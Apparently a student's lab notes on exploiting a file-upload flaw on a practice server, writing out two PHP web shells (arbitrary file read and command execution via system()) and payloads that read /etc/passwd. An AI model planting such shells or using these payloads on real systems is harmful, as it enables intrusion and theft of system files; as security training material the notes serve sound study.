# File Upload

`http://172.16.219.145/upload/example1.php`
- site has a button where we can upload an "image file"

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413200203.png" width="450"/>

## Example 1 - File Traversal Web Shell

first, we will upload `shell_traversal.php` so we can traverse the file system

Let's create the following file:

```php 
<?php 
	echo file_get_contents($_GET['file']); 
?>
```

We upload it to the server
- here the server tells us where the file has been uploaded
- `http://172.16.219.145/upload/images/shell_traversal.php`
- if we don't know - try inject `find / -name "shell_traversal.php" 2>/dev/null`

### Payload

`?file=../../../../etc/passwd`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413200926.png" width="600"/>

## Example 2 - Command Execution Shell

we upload `shell_execute.php` so we can execute command on the web server

```php
<?php 
	system($_GET['cmd']); 
?>
```

### Payload

`?cmd=cat /etc/passwd`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413201620.png" width="600"/>

---

Last Update 20250413